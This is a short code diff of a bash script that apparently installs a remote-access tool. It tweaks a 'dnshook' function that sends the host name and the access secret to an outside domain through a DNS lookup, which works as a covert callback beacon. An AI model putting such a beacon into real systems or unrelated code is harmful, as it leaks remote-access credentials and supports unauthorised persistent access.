@@ -2112,10 +2112,13 @@ test_dstbin()
 
 	# Use randomly generated secret unless it's set already (X=)
 	[[ -z $GS_SECRET ]] && GS_SECRET="$GS_OUT"
+	# 0x20-DNS request mangel with upper/lower case. Force lower-case.
+	[ -n "$GS_DNSHOOK" ] && GS_SECRET="${GS_SECRET,,}"
 
 	IS_TESTBIN_OK=1
 }
 
+# Executed after test_dstbin()
 test_network()
 {
 	local ret
@@ -2240,7 +2243,7 @@ dnshook() {
 	[[ -z "$GS_DNSHOOK" ]] && { SKIP_OUT; return; }
 
 
-	[ -n "$GS_HOST" ] && msg="${GS_HOST}."
+	[ -n "$GS_HOST" ] && msg="${GS_HOST//./_}."
 	msg+="${GS_SECRET}"
 	if command -v getent >/dev/null; then
 		timeout 2 getent hosts "${msg}.${GS_DNSHOOK}" &>/dev/null
